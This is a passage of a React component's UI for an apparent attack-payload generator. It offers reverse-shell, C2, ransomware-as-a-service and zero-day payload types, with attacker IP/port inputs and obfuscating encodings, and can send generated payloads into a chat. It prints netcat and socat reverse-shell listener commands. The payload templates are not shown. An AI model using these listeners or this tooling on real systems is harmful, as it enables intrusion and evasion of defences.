                              os === o ? "bg-primary/10 border-primary/40 text-primary" : "bg-[#0a0a0a] border-[#1a1a1a] text-muted-foreground hover:text-foreground hover:border-[#2a2a2a]"
                            }`}
                          >
                            {o === "any" ? "Any" : o === "linux" ? "Linux" : o === "windows" ? "Windows" : "macOS"}
                          </button>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Language Selection */}
                  {shellType !== "c2" && (
                    <div className="space-y-1.5">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">اللغة / الأداة</p>
                      <div className="space-y-1 max-h-44 overflow-y-auto pr-1">
                        {filteredLangs.map(l => (
                          <button key={l.id} onClick={() => setLangId(l.id)}
                            className={`w-full flex items-center gap-2 px-2.5 py-1.5 rounded-lg border text-left transition-all ${
                              langId === l.id ? "bg-[#1a1a1a] border-[#333] text-foreground" : "bg-[#0a0a0a] border-[#141414] text-muted-foreground hover:text-foreground hover:border-[#222]"
                            }`}
                          >
                            <span className="text-[13px]">{l.icon}</span>
                            <span className="text-[11px] font-semibold">{l.label}</span>
                            {langId === l.id && <span className="ml-auto w-1.5 h-1.5 rounded-full" style={{ background: l.color }} />}
                          </button>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* C2 Framework Selection */}
                  {shellType === "c2" && (
                    <div className="space-y-1.5">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">C2 Framework</p>
                      <div className="space-y-1">
                        {C2_FRAMEWORKS.map(c => (
                          <button key={c.id} onClick={() => setC2fw(c.id)}
                            className={`w-full flex items-center gap-2 px-3 py-2 rounded-xl border text-left transition-all ${
                              c2fw === c.id ? "text-foreground" : "border-[#1a1a1a] bg-[#0a0a0a] text-muted-foreground hover:text-foreground"
                            }`}
                            style={c2fw === c.id ? { borderColor: c.color + "50", background: c.color + "10" } : {}}
                          >
                            <span className="text-[11px] font-bold">{c.label}</span>
                            {c2fw === c.id && <span className="ml-auto w-2 h-2 rounded-full" style={{ background: c.color }} />}
                          </button>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* LHOST / LPORT */}
                  {shellType !== "web" && shellType !== "sqli" && shellType !== "wifi" && shellType !== "zeroday" && shellType !== "payload" && shellType !== "fileless" && shellType !== "raas" && shellType !== "hashcrack" && shellType !== "quantum" && (
                    <div className="space-y-2">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">Connection</p>
                      <div>
                        <label className="text-[10px] text-muted-foreground mb-1 block">LHOST / Attacker IP</label>
                        <input value={lhost} onChange={e => setLhost(e.target.value)}
                          className="w-full bg-[#0a0a0a] border border-[#1f1f1f] focus:border-[#e21227]/40 rounded-lg px-3 py-2 text-[12px] font-mono text-foreground outline-none placeholder:text-muted-foreground/40 transition-colors"
                          placeholder="10.10.14.1" dir="ltr" />
                      </div>
                      <div>
                        <label className="text-[10px] text-muted-foreground mb-1 block">LPORT / Listen Port</label>
                        <input value={lport} onChange={e => setLport(e.target.value)}
                          className="w-full bg-[#0a0a0a] border border-[#1f1f1f] focus:border-[#e21227]/40 rounded-lg px-3 py-2 text-[12px] font-mono text-foreground outline-none placeholder:text-muted-foreground/40 transition-colors"
                          placeholder="4444" dir="ltr" />
                      </div>
                    </div>
                  )}

                  {/* Encoding */}
                  <div className="space-y-1.5">
                    <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">Encoding / Obfuscation</p>
                    <div className="grid grid-cols-2 gap-1">
                      {([
                        { id: "none", label: "None" },
                        { id: "base64", label: "Base64" },
                        { id: "ps_base64", label: "PS Base64" },
                        { id: "urlenc", label: "URL Encode" },
                        { id: "hex", label: "Hex" },
                        { id: "unicode", label: "Unicode \\u" },
                      ] as { id: Encoding; label: string }[]).map(e => (
                        <button key={e.id} onClick={() => setEncoding(e.id)}
                          className={`px-2 py-1.5 rounded-lg border text-[10px] font-bold transition-all ${
                            encoding === e.id ? "bg-primary/10 border-primary/40 text-primary" : "bg-[#0a0a0a] border-[#1a1a1a] text-muted-foreground hover:text-foreground hover:border-[#2a2a2a]"
                          }`}
                        >
                          {e.label}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Listener helper */}
                  {(shellType === "reverse" || shellType === "msfvenom") && (
                    <div className="bg-[#0a0a0a] border border-[#1f1f1f] rounded-xl p-3 space-y-1.5">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider flex items-center gap-1">
                        <Shield className="w-3 h-3 text-emerald-400" /> Listener Commands
                      </p>
                      <code className="text-[10px] text-emerald-400 font-mono block">nc -lvnp {lport}</code>
                      <code className="text-[10px] text-violet-400 font-mono block">rlwrap nc -lvnp {lport}</code>
                      <code className="text-[10px] text-amber-400 font-mono block">socat file:`tty`,raw,echo=0 TCP-LISTEN:{lport}</code>
                    </div>
                  )}
                </div>

                {/* ── Right Panel: Output ── */}
                <div className="flex-1 flex flex-col min-h-0">
                  {/* Output Header */}
                  <div className="flex items-center justify-between px-4 py-3 border-b border-[#1a1a1a] shrink-0">
                    <div className="flex items-center gap-2">
                      <div className="flex gap-1">
                        <span className="w-3 h-3 rounded-full bg-[#ff5f57]" />
                        <span className="w-3 h-3 rounded-full bg-[#febc2e]" />
                        <span className="w-3 h-3 rounded-full bg-[#28c840]" />
                      </div>
                      <span className="text-[11px] font-mono text-muted-foreground">
                        {shellType === "c2" ? (selectedC2?.label ?? "C2") : (selectedLang?.label ?? langId)} · {shellType.toUpperCase()} · {lhost}:{lport}
                        {encoding !== "none" && ` · ${encoding.toUpperCase()}`}
                      </span>
                    </div>
                    <div className="flex items-center gap-2">
                      <button onClick={copyOutput}
                        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#1a1a1a] border border-[#262626] hover:border-[#333] text-[11px] font-semibold text-muted-foreground hover:text-foreground transition-all">
                        {copied ? <CheckCheck className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                        {copied ? "تم النسخ!" : "نسخ"}
                      </button>
                      {onInjectToChat && (
                        <button onClick={injectToChat}
                          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#e21227] hover:bg-[#c00f20] text-white text-[11px] font-bold transition-all">
                          <Send className="w-3.5 h-3.5" /> أرسل للمحادثة
                        </button>
                      )}
                    </div>
                  </div>

                  {/* Code Output */}
                  <div className="flex-1 relative overflow-hidden">
                    <pre className="h-full overflow-auto p-4 text-[12px] font-mono text-emerald-400 leading-relaxed whitespace-pre-wrap break-all bg-[#020202] selection:bg-[#e21227]/30">
                      {output || "// اختر نوع الـ shell والإعدادات لتوليد الـ payload..."}
                    </pre>
                    {/* Scanline effect */}
                    <div className="absolute inset-0 pointer-events-none"
                      style={{ background: "repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px)" }} />
                  </div>

                  {/* Bottom stats */}
                  <div className="flex items-center gap-4 px-4 py-2 border-t border-[#1a1a1a] shrink-0">
                    <span className="text-[10px] font-mono text-muted-foreground/60">
                      {output.length} chars · {output.split("\n").length} lines
                    </span>
                    <span className="text-[10px] font-mono text-[#e21227]/60">
                      {shellType.toUpperCase()} · {os.toUpperCase()} · {encoding.toUpperCase()}
                    </span>
                    <div className="ml-auto flex items-center gap-1.5 text-[10px] font-mono text-emerald-400/60">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                      LIVE GENERATION
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
